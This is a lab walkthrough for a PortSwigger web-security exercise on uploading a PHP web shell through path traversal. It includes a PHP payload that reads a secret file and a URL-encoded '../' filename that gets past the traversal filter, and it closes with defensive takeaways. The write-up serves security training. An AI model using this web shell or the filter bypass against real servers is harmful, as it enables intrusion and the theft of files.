# Lab: Web shell upload via path traversal

**Target URL:** `https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal`

---

## 🎯 Vulnerability Overview
The application attempts to prevent malicious activity by disabling file execution in the intended upload directory (`/files/avatars/`). However, the `filename` parameter is vulnerable to **Path Traversal**. By moving the file to a parent directory (`/files/`) where execution is permitted, an attacker can achieve **Remote Code Execution (RCE)**.

* **Vulnerability:** Path Traversal / Unrestricted File Upload
* **Vulnerable Parameter:** `filename` (POST request)
* **Impact:** Full system compromise / Access to sensitive files (`/home/carlos/secret`)

---

## 🛠️ Exploitation Steps

### 1. Identify the Execution Restriction
1. Log in and upload a PHP shell: `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
2. Access the file via `GET /files/avatars/exploit.php`.
3. **Observation:** The server returns the raw PHP code as plain text. This confirms that the `/avatars/` directory is restricted from executing scripts.

### 2. Intercept and Modify the Upload Request
1. Capture the `POST /my-account/avatar` request using **Burp Suite**.
2. Send the request to **Burp Repeater**.
3. Attempt to change the filename to `filename="../exploit.php"` to move the file to the parent folder.
4. **Observation:** If the response shows the file was still saved in `/avatars/`, the server is stripping the `../` characters to prevent traversal.

### 3. Bypass the Filter with URL Encoding
In Burp Repeater, obfuscate the traversal sequence to bypass the server's security filter:

1. **URL Encode the Path:** Change `filename="../exploit.php"` to:
   `filename="%2e%2e%2fexploit.php"`
2. **Inject the Shell:** Ensure your PHP payload is still in the body:
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
3. Send the request. The server should now process the traversal and save the file in the `/files/` directory.

### 4. Execute and Retrieve the Secret
1. Change your request in Burp (or use your browser) to target the parent directory: 
   `GET /files/exploit.php`
2. **Observation:** Because the `/files/` directory permits execution, the server processes the PHP and returns the secret.

### 5. Lab Completion
Copy the secret string from the response and submit it to solve the lab.

---

## 📝 Key Takeaways
* **Insufficient Filtering:** Simple security filters that look for `../` can often be bypassed by encoding the characters (e.g., `%2e%2e%2f`).
* **Directory-Specific Permissions:** Disabling execution in one folder is only effective if the application also prevents Path Traversal to other directories.
* **Defense-in-Depth:** Developers should use a whitelist of permitted characters for filenames and store uploaded files in a location outside the web root.

---
